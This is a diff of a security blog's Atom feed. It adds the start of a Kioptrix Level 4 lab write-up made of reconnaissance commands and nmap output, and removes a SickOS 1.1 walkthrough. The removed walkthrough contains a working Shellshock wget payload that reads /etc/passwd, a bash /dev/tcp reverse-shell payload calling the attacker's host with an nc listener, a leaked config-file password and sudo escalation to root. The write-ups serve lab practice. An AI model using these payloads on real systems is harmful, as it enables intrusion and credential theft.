@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-14T16:05:48-05:00</updated>
+  <updated>2016-06-15T16:19:58-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,135 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Vulhub Kioptrix Level 4]]></title>
+    <link href="http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4/"/>
+    <updated>2016-06-15T16:10:59-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Nikto</li>
+<li>Metasploit</li>
+<li>Wfuzz</li>
+<li>Hashcat</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.190 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.190 -p-</code></p>
+
+<pre><code># nmap -sV -v -O -A -T5 192.168.79.190 -p-
+
+Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-15 16:14 CDT
+NSE: Loaded 138 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 16:14
+Completed NSE at 16:14, 0.00s elapsed
+Initiating NSE at 16:14
+Completed NSE at 16:14, 0.00s elapsed
+Initiating ARP Ping Scan at 16:14
+Scanning 192.168.79.190 [1 port]
+Completed ARP Ping Scan at 16:14, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 16:14
+Completed Parallel DNS resolution of 1 host. at 16:14, 1.99s elapsed
+Initiating SYN Stealth Scan at 16:14
+Scanning 192.168.79.190 [65535 ports]
+Discovered open port 445/tcp on 192.168.79.190
+Discovered open port 139/tcp on 192.168.79.190
+Discovered open port 80/tcp on 192.168.79.190
+Discovered open port 22/tcp on 192.168.79.190
+Completed SYN Stealth Scan at 16:14, 11.91s elapsed (65535 total ports)
+Initiating Service scan at 16:14
+Scanning 4 services on 192.168.79.190
+Completed Service scan at 16:14, 11.02s elapsed (4 services on 1 host)
+Initiating OS detection (try #1) against 192.168.79.190
+NSE: Script scanning 192.168.79.190.
+Initiating NSE at 16:14
+Completed NSE at 16:15, 15.56s elapsed
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.01s elapsed
+Nmap scan report for 192.168.79.190
+Host is up (0.00033s latency).
+Not shown: 39528 closed ports, 26003 filtered ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
+|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+MAC Address: 00:0C:29:EA:4D:22 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Uptime guess: 0.001 days (since Wed Jun 15 16:13:14 2016)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=203 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| Names:
+|   KIOPTRIX4&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   KIOPTRIX4&lt;03&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   KIOPTRIX4&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|_  WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.28a)
+|   Computer name: Kioptrix4
+|   NetBIOS computer name: 
+|   Domain name: localdomain
+|   FQDN: Kioptrix4.localdomain
+|_  System time: 2016-06-15T17:15:00-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.33 ms 192.168.79.190
+
+NSE: Script Post-scanning.
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.00s elapsed
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
+           Raw packets sent: 91558 (4.029MB) | Rcvd: 39548 (1.583MB)
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[vulhub-Kioptrix Level 3]]></title>
@@ -764,121 +893,6 @@ int main(int argc, char ** argv)
 <p><img src="/images/blog/vulhub/sickos1.2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>DONE</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[sickos:1.1]]></title>
-    <link href="http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1/"/>
-    <updated>2016-05-18T12:50:37-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1</id>
-    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>
-
-<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>Metasploit</li>
-<li>FoxyProxy</li>
-</ul>
-
-
-<!--more-->
-
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.178 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.79.178 -p-</code></p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like port 22 and port 3218 are openning. Port 3218 is running Squid. open msfconsole, search squid. I found that:</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Then use this module to scan the squid service:</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like port 80 is opened:</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Use FoxyProxy add-on to configure proxy:</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now visit <a href="http://192.168.79.178">http://192.168.79.178</a></p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now let&rsquo;s use nikto to scan the server:</p>
-
-<pre><code>nikto -h localhost -useproxy http://192.168.79.178:3128
-</code></pre>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>looks like there is a shellshock vuln</p>
-
-<p>Let&rsquo;s test it:</p>
-
-<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
-</code></pre>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>It works and looks  there is an account sickos.</p>
-
-<p>Now lets setup reverse shell.</p>
-
-<p>netcat-style shell access without netcat:</p>
-
-<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>
-
-<p>in one terminal:</p>
-
-<p><code>nc -nlvp 4444</code></p>
-
-<p>in another terminal:</p>
-
-<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.79.173/4444 0&lt;&amp;1" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
-</code></pre>
-
-<p>get the shell:</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>After Enumeration, got a interesting file: <code>/var/www/wolfcms/config.php</code></p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like the password is <code>john@123</code></p>
-
-<p>SSH to the target server as sickos and use this password:</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Check sickos&rsquo;s privilege:</p>
-
-<p><code>sudo -l</code></p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like it can run as root</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>YES</p>
 ]]></content>
   </entry>
   
